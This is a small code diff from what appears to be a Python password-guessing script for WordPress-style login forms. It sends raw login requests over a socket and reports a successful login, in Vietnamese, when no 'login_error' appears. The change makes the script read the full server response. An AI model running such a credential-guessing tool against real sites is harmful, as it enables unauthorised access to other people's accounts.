@@ -19,7 +19,12 @@ Content-Type: application/x-www-form-urlencoded\r
 \r
 log={}&pwd={}'''.format(url, length, user, password)
     sock.send(req.encode())
-    data=sock.recv(2048)
+    data = b""
+    while 1:
+        tmp = sock.recv(2048)
+        if not tmp:
+            break
+        data += tmp
     data = data.decode()
     if "login_error" not in data:
         print("User {} dang nhap thanh cong".format(user))
